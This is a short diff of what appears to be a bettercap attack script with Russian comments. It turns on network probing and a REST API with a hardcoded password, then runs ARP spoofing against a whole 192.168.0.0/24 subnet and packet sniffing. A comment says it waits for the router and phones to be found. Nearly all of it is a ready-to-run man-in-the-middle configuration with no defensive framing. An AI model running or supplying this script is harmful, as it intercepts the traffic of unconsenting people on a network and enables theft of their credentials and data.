@@ -1,5 +1,4 @@
 net.probe on
-net.recon on
 
 set api.rest.address 127.0.0.1
 set api.rest.port 8081
@@ -7,12 +6,10 @@ set api.rest.username netwatch
 set api.rest.password 192837465
 api.rest on
 
+# Ждем 10 секунд, пока net.probe найдет роутер и телефоны
+sleep 10
 
-sleep 3
-
-# Настраиваем ARP-спуфинг на всю подсеть целиком
+# Запускаем спуфинг и сниффер
 set arp.spoof.targets 192.168.0.0/24
-set arp.spoof.fullduplex true
 arp.spoof on
-
 net.sniff on
